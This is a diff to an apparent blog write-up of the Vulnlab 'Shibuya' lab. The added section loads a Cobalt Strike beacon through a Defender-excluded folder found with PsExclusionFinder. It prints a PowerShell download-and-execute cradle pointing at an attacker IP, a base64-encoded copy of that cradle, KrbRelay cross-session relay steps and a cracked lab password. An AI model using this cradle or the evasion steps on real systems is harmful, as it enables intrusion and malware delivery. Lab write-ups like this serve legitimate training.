@@ -2,7 +2,7 @@
 title: Vulnlab - Shibuya
 date: 2025-02-22 02:30:00 +/-TTTT
 categories: [VulnLab]
-tags: [KrbRelay, ESC1]     # TAG names should always be lowercase
+tags: [KrbRelay, Cross Session Relay, ESC1]     # TAG names should always be lowercase
 image : /assets/images/shibuya_slide.png
 ---
 10.10.100.216
@@ -473,3 +473,36 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:[readactedaf]
 ```
 
+## With Cobalt Strike
+
+I just wanna do with CS lets see. Before i load my beacon i will use [PsExclusionFinder](https://github.com/JakubStanior/PsExclusionFinder)
+we cannot disable defender but we can find an exception folder
+
+```sh
+PS C:\ProgramData> Import-Module .\PsExclusionFinder.ps1
+PS C:\ProgramData> Get-ExcludedDirectories -Directory "C:\programdata\" -Depth 2    
+Found a total of 52 folders inside C:\programdata\ within a depth of 2.
+[+] Folder excluded: C:\programdata\shibuya
+52 folders completed in 4.2840048 seconds.
+```
+so lets ho here and load our beacon
+
+```powershell
+➜  Shibuya cat shell.ps1 
+iwr -usebasicparsing -uri http://10.8.2.152/a.ps1|iex
+➜  Shibuya cat shell.ps1 | iconv -t UTF-16LE | base64 -w0
+aQB3AHIAIAAtAHUAcwBlAGIAYQBzAGkAYwBwAGEAcgBzAGkAbgBnACAALQB1AHIAaQAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AOAAuADIALgAxADUAMgAvAGEALgBwAHMAMQB8AGkAZQB4AAoA
+```
+![alt text](<../assets/images/shibuyacs.png>)
+
+we got beacon for Simon.Watson but for Crosse Session Relay attack we need svc_autojoin’s beacon so lets just spawn it
+
+![alt text](<../assets/images/shibuyacs1.png>)
+
+nice now we can run KrbRelay without RunAsCs.exe 
+
+![alt text](<../assets/images/shibuyacs2.png>)
+
+and crack it  Sail2Boat3
+
+![alt text](<../assets/images/shibuyacs3.png>)
